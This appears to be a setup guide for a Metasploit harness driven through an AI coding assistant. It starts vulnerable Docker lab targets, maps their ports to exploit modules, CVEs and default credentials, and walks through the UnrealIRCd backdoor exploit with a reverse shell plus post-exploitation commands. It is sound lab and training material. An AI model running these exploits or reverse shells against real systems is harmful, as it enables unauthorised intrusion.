# Lab Setup and Usage Guide

Step-by-step instructions to start the vulnerable lab targets and run your first exploit.

## Prerequisites

- **Docker Desktop** installed and running on Windows
- **WSL2** with Kali Linux (Metasploit installed)
- Harness configured (run `.\scripts\bootstrap.ps1` if you haven't)

## Quick Start

```powershell
# Start all lab targets (pulls images on first run)
.\scripts\start-lab-targets.ps1
```

This starts the Docker Compose stack plus checks for Metasploitable2.

## Understanding the Network

Docker containers on Windows run in a Linux VM. From WSL2, you cannot reach container IPs directly (172.17.x.x). Instead, Docker maps container ports to the Windows host, and WSL accesses them via **`10.255.255.254`** (the Windows host IP as seen from WSL2).

```
+--------+       +------------------+       +-----------------+
|  WSL2  | ----> | 10.255.255.254   | ----> | Docker Container|
| (Kali) |       | (Windows Host)   |       | (172.17.0.x)    |
+--------+       | Port 9667 mapped |       | Port 6667       |
                 +------------------+       +-----------------+
```

So when MCP tools say `RHOSTS`, use `10.255.255.254` with the mapped port number.

## Port Map

### Metasploitable2

| Service | Container Port | Mapped Port | Exploit |
|---------|---------------|-------------|---------|
| FTP (vsftpd) | 21 | **9021** | `unix/ftp/vsftpd_234_backdoor` |
| SSH | 22 | **9022** | `auxiliary/scanner/ssh/ssh_login` |
| Telnet | 23 | **9023** | `auxiliary/scanner/telnet/telnet_login` |
| SMTP | 25 | **9025** | `auxiliary/scanner/smtp/smtp_enum` |
| HTTP | 80 | **9080** | Web app attacks |
| NetBIOS | 139 | **9139** | SMB enumeration |
| SMB | 445 | **9445** | `exploit/multi/samba/usermap_script` |
| Java RMI | 1099 | **9099** | `exploit/multi/misc/java_rmi_server` |
| Backdoor | 1524 | **9524** | Direct shell (nc) |
| ProFTPd | 2121 | **9121** | FTP attacks |
| MySQL | 3306 | **9306** | `auxiliary/scanner/mysql/mysql_login` |
| distcc | 3632 | **9632** | `exploit/unix/misc/distcc_exec` |
| PostgreSQL | 5432 | **9432** | `auxiliary/scanner/postgres/postgres_login` |
| VNC | 5900 | **9900** | `auxiliary/scanner/vnc/vnc_login` |
| nmap-backdoor | 6200 | **6200** | vsftpd triggers this |
| UnrealIRCd | 6667 | **9667** | `unix/irc/unreal_ircd_3281_backdoor` |
| Ruby DRb | 8787 | **9787** | `exploit/linux/misc/drb_remote_codeexec` |

### Docker Compose Stack (lab/docker-compose.yml)

| Service | Mapped Port | Exploit |
|---------|-------------|---------|
| DVWA | **9100** | SQLi, XSS, file upload (login: admin/password) |
| Tomcat 8.5.19 | **9101** | CVE-2017-12615 JSP upload bypass |
| Struts2 2.3.30 | **9102** | CVE-2017-5638 S2-045 OGNL RCE |
| WordPress 4.6 | **9103** | REST API content injection |
| Redis 4.0.14 | **9137** | No auth, RCE via replication |
| Samba 4.6.3 | **9145** | CVE-2017-7494 SambaCry |
| Metasploitable3 SSH | **10022** | `auxiliary/scanner/ssh/ssh_login` (msfadmin/msfadmin) |
| Metasploitable3 IRC | **10667** | `unix/irc/unreal_ircd_3281_backdoor` |

## Starting Metasploitable2 Manually

If `start-lab-targets.ps1` reports Metasploitable2 is missing:

```powershell
docker run -d --name metasploitable2 --restart unless-stopped `
  -p 9021:21 -p 9022:22 -p 9023:23 -p 9025:25 -p 9080:80 `
  -p 9139:139 -p 9445:445 -p 9099:1099 -p 9524:1524 -p 9121:2121 `
  -p 9306:3306 -p 9632:3632 -p 9432:5432 -p 9900:5900 `
  -p 6200:6200 -p 9667:6667 -p 9787:8787 `
  tleemcjr/metasploitable2:latest
```

## LHOST (Reverse Shell Callback)

For reverse shells to work, the target container must be able to reach your WSL IP.

**Auto-detection:** The MCP server auto-detects LHOST from WSL `eth0`. Run `msf_get_lab_network` to see the detected value.

**Manual override:** Copy `engagements/lab-default/lhost.yaml.example` to `lhost.yaml` and set your IP:

```powershell
copy engagements\lab-default\lhost.yaml.example engagements\lab-default\lhost.yaml
```

To find your WSL IP: `wsl -e bash -c "ip -4 addr show eth0 | grep inet"`

## Your First Exploit (UnrealIRCd Backdoor)

This is the most reliable lab target. In Cursor chat:

**Step 1: Verify connectivity**
```
Use msf_status to check the RPC connection
```

**Step 2: Check the module**
```
Use msf_module_check with:
  module_type: exploit
  module_name: exploit/unix/irc/unreal_ircd_3281_backdoor
  options: {RHOSTS: "10.255.255.254", RPORT: 9667}
  engagement_id: lab-default
```

**Step 3: Run the exploit**
```
Use msf_run_exploit with:
  module_name: exploit/unix/irc/unreal_ircd_3281_backdoor
  payload: cmd/unix/reverse_perl
  options: {RHOSTS: "10.255.255.254", RPORT: 9667, LHOST: "<your WSL IP>", LPORT: 4444}
  engagement_id: lab-default
```

**Step 4: Interact with the session**
```
Use msf_list_active_sessions to see your shell
Use msf_send_session_command with session_id and command: "id"
```

## Exploit Notes

### vsftpd (`unix/ftp/vsftpd_234_backdoor`)

- Port 6200 must be reachable (Docker maps it directly)
- MSF 6 module check may fail (Docker always shows 6200 open)
- Use `ForceExploit: true` and `AutoCheck: false`
- Payload: `generic/shell_reverse_tcp` (not HTTP stager)
- Unreliable in Docker; use a VM for production demos

### UnrealIRCd (`unix/irc/unreal_ircd_3281_backdoor`)

- Most reliable Docker exploit target
- Check passes; reverse shell works if container can reach LHOST
- Recommended for first-time demos

### SSH Login (Metasploitable3)

- Port 10022, credentials: msfadmin/msfadmin
- Creates a command shell session (not Meterpreter)
- Good for testing session commands and post-exploitation

## Comparison with Other MCP Servers

| Feature | msf-harness (this repo) | Official `msfmcpd` | GH05TCREW/MetasploitMCP |
|---------|-------------------------|--------------------|-------------------------|
| Read tools | 23 + lab helpers | 8 read-only | List/search modules |
| Exploit execution | Yes (ROE-gated) | No (read-only) | Yes |
| Console execution | Yes (default) | N/A | Yes (default) |
| Scope / ROE enforcement | Yes (3 layers) | No | No |
| Engagement workflow | Yes (PTES phases) | No | No |
| Session management | Full (upgrade, scripts) | No | Basic |
| Post-exploitation | 14 tools | No | No |
| Safety hooks | 18-script pipeline | No | No |
